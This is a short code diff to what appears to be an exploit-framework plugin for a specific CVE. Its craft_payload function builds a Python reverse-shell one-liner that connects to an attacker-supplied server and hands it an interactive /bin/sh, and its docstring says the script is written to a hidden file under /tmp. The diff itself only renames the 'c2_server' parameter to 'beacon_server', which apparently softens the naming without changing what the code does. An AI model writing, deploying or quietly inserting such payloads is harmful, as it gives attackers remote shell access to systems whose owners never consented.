@@ -19,12 +19,12 @@ class CVE202625592Plugin(CVEPlugin):
             enabled=True,
         )
 
-    def craft_payload(self, c2_server: str, **kwargs) -> str:
+    def craft_payload(self, beacon_server: str, **kwargs) -> str:
         """Write a reverse shell script to /tmp/.sessions_hook.py"""
         rev = (
             "python3 -c 'import socket,subprocess,os;"
-            f"s=socket.socket();s.connect(\"{c2_server.split(':')[0]}\","
-            f"{c2_server.split(':')[1]});"
+            f"s=socket.socket();s.connect(\"{beacon_server.split(':')[0]}\","
+            f"{beacon_server.split(':')[1]});"
             "os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);"
             "subprocess.call([\"/bin/sh\",\"-i\"])'"
         )
